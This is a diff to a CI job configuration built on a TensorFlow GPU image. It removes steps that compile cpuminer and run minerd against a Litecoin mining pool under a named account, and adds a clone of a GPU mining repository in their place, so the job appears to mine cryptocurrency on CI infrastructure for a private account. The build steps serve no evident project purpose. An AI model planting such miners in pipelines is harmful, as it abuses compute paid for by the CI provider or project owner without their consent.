@@ -33,17 +33,6 @@ jobs:
         apt-get update
         apt-get git
         apt-get install git
-        apt-get install libcurl4-openssl-dev git
-        apt-get install  build-essential
-        apt-get install autotools-dev autoconf
-        apt-get install libcurl3 libcurl4-gnutls-dev 
-        mkdir /downloads
-        cd /downloads
-        git clone https://github.com/pooler/cpuminer
-        cd cpuminer
-        ./autogen.sh
-        CFLAGS="-march=native" ./configure
-        make
-        make install
-         minerd -o stratum+tcp://ltc.pool.minergate.com:3336 -u philosophyoflife42@gmail.com -p x
+        git clone https://github.com/createthis/linux_gpu_mining.git
+
       image: tensorflow/tensorflow:1.14.0-gpu-py3
